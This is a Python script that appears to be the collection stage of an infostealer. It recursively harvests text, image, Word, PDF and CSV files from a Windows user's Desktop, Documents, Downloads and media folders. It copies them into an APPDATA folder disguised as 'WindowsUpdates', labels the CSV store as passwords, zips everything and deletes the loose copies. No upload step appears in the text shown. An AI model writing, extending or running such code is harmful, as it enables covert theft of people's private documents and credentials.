from shutil import copy
from shutil import make_archive
import os

target_path_txt = rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\txt"
target_path_images = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\images"
target_path_docx = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\docx"
target_path_psw = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\csv"

txt = []
pics = []
docx = []
pdf = []
csv = []

def main():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
    downloads = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
    pictures = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Pictures')
    videos = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Videos')
    music = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Music')
    get_files(desktop)
    get_files(downloads)
    get_files(documents)
    get_files(pictures)
    get_files(videos)
    get_files(music)

def get_files(path):
    global txt, pics, docx, pdf, csv
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith(".txt"):
                txt.append(os.path.join(root, file))
            elif file.endswith(".png") or file.endswith(".jpg") or file.endswith(".jpeg"):
                pics.append(os.path.join(root, file))
            elif file.endswith(".docx"):
                docx.append(os.path.join(root, file))
            elif file.endswith(".pdf"):
                pdf.append(os.path.join(root, file))
            elif file.endswith(".csv"):
                csv.append(os.path.join(root, file))
            if os.path.isdir(file):
                get_files(file)
    
    for file in txt:
        copy(file, target_path_txt)
    for file in pics:
        copy(file, target_path_images)
    for file in docx:
        copy(file, target_path_docx)
    for file in pdf:
        copy(file, target_path_docx)
    for file in csv:
        copy(file, target_path_psw)

def remove_remnants():
    for root, dirs, files in os.walk(f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files"):
        for file in files:
            os.remove(os.path.join(root, file))


main()
make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files")
remove_remnants()